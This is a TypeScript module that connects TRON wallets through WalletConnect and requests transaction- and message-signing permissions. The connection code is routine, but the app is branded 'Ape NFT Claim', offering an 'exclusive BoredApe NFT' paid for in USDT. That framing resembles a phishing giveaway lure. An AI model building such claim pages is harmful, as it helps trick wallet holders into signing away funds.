import { UniversalProvider } from "@walletconnect/universal-provider";
// Use Reown's updated modal if you want better UI (optional migration)
import { WalletConnectModal } from "@walletconnect/modal"; // or migrate to Reown components later

export const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "";

let provider: InstanceType<typeof UniversalProvider> | null = null;
let modal: WalletConnectModal | null = null;

export async function initWalletConnect() {
  if (provider) return provider;

  if (typeof window === "undefined") throw new Error("Browser only");

  if (!PROJECT_ID) throw new Error("Missing PROJECT_ID");

  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "Ape NFT Claim",
      description: "Claim your exclusive BoredApe NFT with USDT",
      url: window.location.origin,
      icons: ["https://avatars.githubusercontent.com/u/37784886"],
    },
    relayUrl: "wss://relay.walletconnect.com", // or Reown's relay if preferred
  });

  // Optional: Use Reown's modal styling/theme if migrating partially
  if (!modal) {
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      // No need for chains here — handled in connect()
      themeMode: "dark",
      themeVariables: { "--wcm-z-index": "9999" },
      explorerRecommendedWalletIds: [
        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet example
        // Add more TRON-supporting wallets
      ],
    });
  }

  return provider;
}

export async function connectWalletConnect() {
  const wcProvider = await initWalletConnect();

  modal?.openModal();

  const session = await wcProvider.connect({
    optionalNamespaces: {
      tron: {
        chains: ["tron:0x2b6653dc"], // Correct CAIP-2 for TRON Mainnet
        methods: [
          "tron_signTransaction",
          "tron_signMessage",
          "tron_signMessageV2",
          // Add "personal_sign" or others if your wallets need them
        ],
        events: ["chainChanged", "accountsChanged"], // Optional but useful
      },
    },
  });

  // No .enable() needed — connect() waits for approval
  modal?.closeModal();

  if (!session) throw new Error("Failed to connect wallet");

  console.log("Connected TRON session:", session.namespaces.tron);

  // To sign (example usage later in your app):
  // const result = await wcProvider.request({
  //   chainId: "tron:0x2b6653dc",
  //   topic: session.topic,
  //   request: { method: "tron_signTransaction", params: [tx] }
  // });

  return wcProvider;
}


export async function disconnectWalletConnect() {
  if (provider) {
    await provider.disconnect();
    provider = null;
  }
}

export function getWalletConnectProvider() {
  return provider;
}
